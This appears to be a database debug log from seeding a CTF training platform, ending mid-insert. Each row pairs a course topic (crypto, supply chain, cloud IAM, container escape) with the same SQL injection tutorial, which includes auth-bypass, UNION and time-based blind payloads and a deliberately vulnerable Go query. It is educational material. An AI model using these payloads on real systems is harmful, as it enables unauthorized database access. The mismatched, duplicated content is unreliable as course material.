[0m[33m[0.470ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 43 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.143ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.255','2025-06-09 14:07:54.255',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,43) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.380ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[14.320ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.262','2025-06-09 14:07:54.262',NULL,'cryptographic implementations','Avoiding common crypto pitfalls',250,4) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.509ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.441ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 44 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.409ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.277','2025-06-09 14:07:54.277',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,44) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.577ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.941ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.285','2025-06-09 14:07:54.285',NULL,'supply chain security','Securing third-party dependencies',220,3) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[6.745ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.489ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 45 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[19.189ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.301','2025-06-09 14:07:54.301',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,45) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.420ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[24.138ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.311','2025-06-09 14:07:54.311',NULL,'iam privilege escalation','Exploiting AWS/GCP/Azure permissions',26,5) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.419ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.449ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 46 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.722ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.336','2025-06-09 14:07:54.336',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,46) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.423ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.886ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.344','2025-06-09 14:07:54.344',NULL,'container breakouts','Escaping Docker/Kubernetes isolation',20,5) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.515ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.427ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 47 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[39.945ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.352','2025-06-09 14:07:54.352',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

